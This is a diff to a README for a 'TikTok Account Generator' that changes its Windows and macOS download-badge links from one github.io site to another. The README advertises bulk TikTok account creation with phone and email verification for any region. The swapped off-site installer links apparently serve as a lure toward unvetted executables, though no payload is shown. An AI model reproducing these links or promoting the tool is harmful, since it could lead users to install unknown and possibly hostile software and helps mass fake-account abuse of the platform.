@@ -1,7 +1,7 @@
 # TikTok Account Generator
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
 
 TikTok account generator with phone and email verification support. Generate bulk TikTok accounts for any region with custom usernames.
 
